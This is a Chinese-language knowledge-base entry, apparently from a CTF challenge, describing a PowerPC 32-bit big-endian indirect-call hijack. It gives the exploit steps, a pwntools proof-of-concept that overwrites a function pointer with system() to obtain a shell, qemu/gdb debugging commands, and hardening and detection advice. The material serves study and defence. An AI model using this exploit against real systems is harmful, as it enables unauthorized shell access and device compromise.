---
id: binary-pwn-rop-powerpc32-indirect-call-hijack-register-arg
title: PowerPC 32-bit 大端间接调用劫持：写 40 字节偏移处的函数指针，用 addi r9,r31,0x1C + mr r3,r9 把 /bin/sh 喂给 system
type: scenario
domain: binary
path: binary/pwn/rop
technique: powerpc32-indirect-call-fptr-hijack-register-arg
aliases:
- PowerPC PWN
- ppc32 间接调用劫持
- bctrl 劫持
- mtctr r9 bctrl
- addi r9 r31 0x1C
- 数字中国 pwn起源
tags:
- pwn
- powerpc
- ppc32
- big-endian
- rop
- qemu
- ctf
- indirect-call
cve: []
severity: medium
confidence: medium
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-T2-3W9
  verified_at: '2026-11-09T03:34:33+08:00'
  notes: 已对照原文核对；本次核对未读取图片；ppc32 大端偏移 40 处函数指针劫持、mtctr r9/bctrl、addi r9,r31,0x1C;mr r3,r9 供参、system=0x100006F0 与大端打包均与正文贴出的 EXP 一致。未验证点：未运行 EXP，gadget 与地址来自未读截图
---

## 一句话结论

PowerPC 32-bit 大端程序里出现 `(*(void (**)(int))(v5 + 40))(v3)` 这类「从结构体/缓冲区偏移 40 处取函数指针再调用」时，只要前面那个输入点能写到 offset 40，就能把调用目标换成任意地址（如 `system`）；参数不是靠栈而是靠寄存器传递，因此还要利用 `addi r9, r31, 0x1C; mr r3, r9` 这段把 `r3` 指向栈上 `/bin/sh` 的 gadget 才能 getshell。

## 原理

- PowerPC 的调用约定是**寄存器传参**：`r3`–`r10` 依次承载参数、`r3` 同时是返回值寄存器；被调函数返回地址放在 `LR`，调用指令是 `bl`（把返回地址存 `LR` 并跳转）。因此「栈溢出覆盖返回地址」在 PPC 上不总是主路径，更常见的是覆盖函数指针/跳转目标。
- 通过 `mtctr r9; bctrl` 实现的间接调用中，跳转目标来自 `r9`（即从内存取出的那个函数指针），而 `bctrl` 会把返回地址写回 `LR` 后跳到 `CTR`。所以控制 `r9` 的来源就等于控制执行流，无需改栈上的 `LR`。
- 参数 `v3` 是前一语句 `puts` 的返回值（输出字符数），不可控；真正让 `system("/bin/sh")` 成立的是调用前那段 `addi r9, r31, 0x1C; mr r3, r9`：`r31` 在本函数里指向栈帧基址，`r31+0x1C` 正好落在我们通过输入写入的 `/bin/sh` 上，于是 `r3` 被重写成字符串指针。
- 大端的坑：payload 必须按大端打包（`p32` 前后要设 `context.endian='big'`），否则写进去的函数指针字节序反了会跳到错误地址；这是同类题最常见的失败原因。
- 静态链接程序里 `system` 地址固定（无 PIE/ASLR 时），无需先泄露 libc；若为动态链接则需先泄 `libc` 基址再算 `system` 偏移。

## 触发条件

- 目标为 PowerPC 32-bit 大端 ELF（`file` 显示 `powerpc-32-big`），静态链接且无 PIE，`system` 地址可直接取。
- 程序存在「从可控缓冲区偏移处取函数指针并间接调用」的逻辑，且该偏移（本例 40）之前留有多余空间可用作字符串存放。
- 能定位到调用前改写 `r3` 的 gadget（`addi r9, r31, 0x1C; mr r3, r9` 一类，`r31` 为栈基址）。
- 有 `qemu-ppc-static`（或 `qemu-ppc -L <cross-libc>`）与 `gdb-multiarch` 用于验证跳转目标与 `r3` 指向。

## 利用步骤

1. `file ./main` 确认 `powerpc-32-big`；用 `qemu-ppc-static ./main` 跑通原始逻辑。
2. 逆向定位间接调用点，确认函数指针来自「缓冲区 + 40」以及 `r9` 由 `mtctr r9` 装入 `CTR`。
3. 找调用后置 gadget：`addi r9, r31, 0x1C; mr r3, r9`，确认 `r31+0x1C` 落在输入缓冲区内的可控位置。
4. 构造 payload：`/bin/sh` + 填充到 offset 40 + `p32(system)`，全程大端。
5. 用 `qemu-ppc -g 1234 -L ... ./main` 起程序，另一终端 `gdb-multiarch -q -ex "set architecture powerpc:common" ./main` 后 `set endian big; target remote :1234`，在 `bctrl` 前确认 `r9` 为 `system`、`r3` 指向 `/bin/sh`。
6. 发送 payload 取 shell。

## PoC

```python
from pwn import *
context.endian = 'big'          # 关键：大端
p = process(['qemu-ppc-static', './main'])

system = 0x100006F0             # 静态链接、无 PIE 时固定
payload  = '/bin/sh;' + b'a'*32 + p32(system)   # 字符串放在缓冲区起始，供 r31+0x1C 指向
p.sendlineafter('comment.\n', payload)
p.interactive()
```

调试连接：

```text
$ qemu-ppc -g 1234 -L /usr/powerpc-linux-gnu ./main
$ gdb-multiarch -q -ex "set architecture powerpc:common" ./main
(gdb) set endian big
(gdb) target remote :1234
```

判定：`bctrl` 执行前 `r9 == system`，进入 `system` 时 `r3` 指向 `"/bin/sh"`，返回交互式 shell。

## 变体与关联

- 变体：若结构体偏移不是 40，按实际 disasm 计算；同理可换成任意「从可控内存取指针再调用」的形态（`lwz rX, off(rY); mtctr rX; bctrl`）。
- 变体：动态链接时先用格式化/输出接口泄 libc（`puts` GOT），再用 `system = libc_base + off`。
- 关联：[[binary-pwn-rop-mips32-stack-frame-gadget-args]]（同为非 x86 的寄存器/栈帧约定差异，但 MIPS 是 `$ra`/`$t9` 体系，PPC 是 `LR`/`CTR` 体系）。
- 关联：[[binary-pwn-stack-nik-router-cgi-shm-negative-len-arm-rop]]（另一 RISC 架构的 gadget 组链思路对照）。

## 检测与防御

- 加固：编译期开启 PIE/ASLR 让 `system` 地址不可预测；启用栈保护与 RELRO。
- 加固：避免从可写缓冲区中取出函数指针并直接调用（改为静态分派或对指针做完整性校验）。
- 检测（分析侧）：`mtctr` + `bctrl`/`bctrl` 附近的间接调用是 PPC 上最值得下断点的位置；在 `bctrl` 前检查 `CTR` 目标是否落在代码段合法范围。
- 检测（赛事/评测侧）：payload 中偏移 40 处的 4 字节若不是合法代码地址，即为典型劫持特征。
